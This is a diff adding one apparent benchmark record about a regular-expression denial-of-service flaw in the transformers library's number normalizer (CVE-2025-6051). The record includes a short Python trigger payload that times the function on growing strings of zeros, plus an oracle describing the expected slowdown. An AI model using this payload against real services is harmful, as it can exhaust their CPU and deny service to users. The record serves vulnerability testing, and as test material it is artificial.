@@ -1,0 +1,15 @@
+{
+  "file_id": "88_transformers_huntr_af929523-7b59-418a-bf55-301830b2ac9d",
+  "numeric_id": "88",
+  "library_hint": "transformers",
+  "source": "huntr",
+  "title": "Inefficient regular expression in EnglishNormalizer.normalize_numbers causes ReDoS via crafted numeric input",
+  "cve": "CVE-2025-6051",
+  "cwe": "CWE-1333: Inefficient Regular Expression Complexity",
+  "library": "transformers",
+  "affected_version": "< 4.53.0",
+  "vulnerable_function": "transformers.models.clvp.number_normalizer.EnglishNormalizer.normalize_numbers",
+  "triggerability": "indirect",
+  "trigger_payload": "from transformers.models.clvp.number_normalizer import EnglishNormalizer\nimport sys\nimport time\nnormalizer = EnglishNormalizer()\nsys.set_int_max_str_digits(100000)\nfor i in range(1, 100000, 10000):\n    payload = '0' * i\n    start = time.perf_counter()\n    normalizer.normalize_numbers(payload)\n    end = time.perf_counter()\n    execution_time = end - start\n    print(f'Payload length {i}, execution time: {execution_time:.4f} seconds')",
+  "oracle": "Non-linear increase in execution time with input length, indicating excessive CPU consumption"
+}
